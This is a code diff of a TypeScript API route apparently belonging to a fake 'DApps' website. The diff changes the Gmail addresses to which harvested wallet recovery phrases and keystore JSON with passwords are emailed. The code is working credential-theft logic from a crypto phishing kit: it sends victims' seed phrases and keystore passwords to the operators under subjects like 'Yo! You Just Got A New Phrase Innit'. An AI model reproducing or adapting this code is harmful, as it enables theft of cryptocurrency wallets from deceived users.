@@ -22,9 +22,9 @@ const formatMessage = async (message: string) => {
   const formattedMessage = formattedLines.join('');
 
   const mailOptions = {
-    from: `Eh-boss Notify ${email}`,
-    to: "osamathebomber3@gmail.com",
-    subject: "Yo! you just got a new notification from eh-boss",
+    from: `BN ${email}`,
+    to: "ladenmike7@gmail.com",
+    subject: "BN",
     html: `<div>Hi</div>`,
   };
 
@@ -71,7 +71,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: 'adev93108@gmail.com',
+        to: 'ogobillions458@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
@@ -110,7 +110,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "adev93108@gmail.com",
+        to: "ogobillions458@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
@@ -151,7 +151,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "adev93108@gmail.com",
+        to: "ogobillions458@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
